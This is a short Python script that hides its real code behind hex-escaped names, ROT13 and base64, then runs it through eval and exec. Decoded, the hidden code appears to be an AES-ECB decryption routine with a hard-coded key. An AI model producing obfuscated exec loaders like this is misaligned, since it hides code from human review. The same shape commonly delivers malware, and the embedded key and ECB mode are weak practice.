import base64, codecs

magic = "ZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMNCmZyb20gQ3J5cHRvLlV0aWwuUGFkZGluZyBpbXBvcnQgdW5wYWQNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20gYmluYXNjaWkgaW1wb3J0IGh"
love = "yrTkcMaxAPt0Xp2IwpzI0K2gyrFN9VTVanacBpxSCnzZyoUOaZ3OJpwIwEvR1GTHjAycaG2EKqHbaQDbAPzEyMvObMFuyozAlrKO0MJEsqzSfqJHcBt0XVPNtVTIhL3W5pUEyMS92LJk1MFN9VTV2ATEyL29xMFuyoz"
god = "NyeXB0ZWRfdmFsdWUpDQogICAgY2lwaGVyID0gQUVTLm5ldyhzZWNyZXRfa2V5LCBBRVMuTU9ERV9FQ0IpDQogICAgZGVjcnlwdGVkX3ZhbHVlID0gY2lwaGVyLmRlY3J5cHQoZW5jcnlwdGVkX3ZhbHVlKQ0KICAgI"
destiny = "UIhpTSxMTIxK2EyL3W5pUEyMS92LJk1MFN9VUIhpTSxXTEyL3W5pUEyMS92LJk1MFjtDHIGYzWfo2AeK3AcrzHcQDbtVPNtpzI0qKWhVTuyrTkcMaxbqJ5jLJExMJEsMTIwpayjqTIxK3MuoUIyXF5xMJAiMTHbXD0X"
joy = "\x72\x6f\x74\x31\x33"
trust = (
    eval("\x6d\x61\x67\x69\x63")
    + eval(
        "\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29"
    )
    + eval("\x67\x6f\x64")
    + eval(
        "\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29"
    )
)
eval(compile(base64.b64decode(eval("\x74\x72\x75\x73\x74")), "<string>", "exec"))
